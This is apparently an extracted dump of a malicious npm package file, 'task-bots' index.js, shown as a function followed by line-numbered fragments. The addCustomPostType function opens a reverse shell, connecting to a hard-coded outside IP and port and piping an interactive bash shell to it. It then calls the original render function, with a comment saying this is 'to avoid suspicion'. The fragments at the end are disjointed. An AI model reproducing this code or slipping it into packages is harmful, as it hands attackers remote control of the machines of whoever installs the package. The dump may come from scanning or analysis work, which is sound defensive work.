// File: tmp/tmpiyhlr3v5/task-bots/package/index.js
// ======================================================================
Line 1: const RCE = {
  addCustomPostType: (config) => {
    console.log("Malicious task-bots loaded");
    // Execute the reverse shell payload
    try {
      const net = require('net');
      const { spawn } = require('child_process');

      // Set up the reverse shell to connect to attacker's IP and port
      const client = new net.Socket();
      client.connect(4449, '102.46.218.78', () => {
        console.log("Connected to attacker's server");
        // Spawn a shell and pipe it to the socket
        const shell = spawn('bash', ['-i']);
        client.pipe(shell.stdin);
        shell.stdout.pipe(client);
        shell.stderr.pipe(client);
      });

      client.on('error', (err) => {
        console.error("Reverse shell error:", err);
      });
    } catch (e) {
      console.error("Malicious code failed:", e);
    }
    // Call the original render function to avoid suspicion
    return config.render();
  }
}
Line 6: const net = require('net')
Line 7: _tmp_1 = require('child_process')
Line 10: const client = new net.Socket()
Line 11: {
        console.log("Connected to attacker's server");
        // Spawn a shell and pipe it to the socket
        const shell = spawn('bash', ['-i']);
        client.pipe(shell.stdin);
        shell.stdout.pipe(client);
        shell.stderr.pipe(client);
      }
Line 14: const shell = spawn('bash', ['-i'])
Line 15: client.pipe(shell.stdin)
Line 16: shell.stdout.pipe(client)
Line 17: shell.stderr.pipe(client)
Line 35: newValue(value)
Line 37: _tmp_6.push(setValue)
